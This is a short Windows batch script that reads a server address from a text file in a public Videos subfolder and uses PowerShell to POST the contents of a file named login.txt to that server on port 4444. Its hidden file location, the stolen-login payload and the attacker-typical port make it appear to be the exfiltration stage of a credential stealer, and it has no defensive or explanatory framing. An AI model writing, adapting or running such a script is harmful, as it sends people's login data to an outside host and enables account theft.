@echo off
set /p SERVER_IP=<C:\Users\Public\Videos\GraphicalUserInterface\url.txt

echo Sending data from login.txt to server...
powershell -Command "(Get-Content C:\Users\Public\Videos\GraphicalUserInterface\login.txt) | Invoke-WebRequest -Uri http://%SERVER_IP%:4444 -Method POST -ContentType 'text/plain' -Body (Get-Content -Raw C:\Users\Public\Videos\GraphicalUserInterface\login.txt)"
echo Data sent.
pause
